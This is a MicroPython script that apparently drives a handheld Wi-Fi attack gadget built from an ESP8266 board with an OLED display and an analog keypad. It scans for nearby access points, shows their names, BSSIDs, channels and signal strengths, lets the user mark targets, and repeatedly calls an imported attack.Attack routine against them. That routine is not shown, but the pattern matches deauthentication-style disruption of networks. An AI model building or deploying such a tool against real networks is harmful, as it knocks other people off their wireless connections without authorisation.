from machine import I2C,Pin,ADC
import attack
import time
import ubinascii as binascii
import gc

# ADkeyboard请自己重新测试4个按键的值
i2c=I2C(sda=Pin(04), scl=Pin(05), freq=1000000) #SDA D2 GPIO04; SCL D1 GPIO05
from ssd1306 import SSD1306_I2C
oled = SSD1306_I2C(128, 64, i2c) 
q=attack.ap_list()[0:8]

def view(q,num=0):
    num=mun(num)
    oled.fill(0)
    oled.text("wifi name:",0,0,1)
    oled.text(q[num][0].decode("utf8"),0,8,1)
    oled.text("BSSID:",0,16,1)
    oled.text(binascii.hexlify(q[num][1]).decode("utf8"),0,24,1)
    oled.text("Channel:"+str(q[num][2]),0,32,1)
    oled.text("Signal:"+str(q[num][3])+"dBm",0,40,1)
    oled.show()
    return q[num]
def viewLisn(lisn):
    for i in lisn:
        oled.text("_",0,i*8,1)
    oled.show()
def mun(num):
    if num<0:
        num=0
    elif num>7:
        num=7
    else:
        pass
    return num
def select(q,num=0):
    num=mun(num)
    numP=num*8
    oled.fill(0)
    j=0
    for i in q:
        if j<64:
            oled.text(i[0].decode("utf8"),8,j,1)
            j+=8
    oled.text("*",0,numP,1)
    oled.show()
    return q[num]
def atf(wi,vi):
    if vi==785:
        oled.fill(1)
        oled.text("Attack wifi",0,16,0)
        oled.text(wi[0].decode("utf8"),0,32,0)
        oled.show()
        attack.Attack(attack.sta_if(),wi,1)
    else:
        pass


adc=ADC(0)
wi=select(q,0)
lis=[]
lisn=[]
num=0
st=0
while 1:
    v=adc.read()
    if v in range(150,200):
        num-=1
        num=mun(num)
        wi=select(q,num)
        viewLisn(lisn)
    elif v in range(300,350):
        num+=1
        num=mun(num)
        wi=select(q,num)
        viewLisn(lisn)
    elif v in range(750,800):
        st=785
    elif v in range(0,50):
        st=0
        wi=select(q,num)
        viewLisn(lisn)
    elif v in range(500,550):
        wi=view(q,num)
        num=mun(num)
        if wi in lis:
            lis.remove(wi)
            lisn.remove(num)
        else:
            lis.append(wi)
            lisn.append(num)
    else:
        pass
    if len(lis)>1:
        for i in lis:
            atf(i,st)
    else:
        atf(wi,st)
    time.sleep(0.3)
    gc.collect()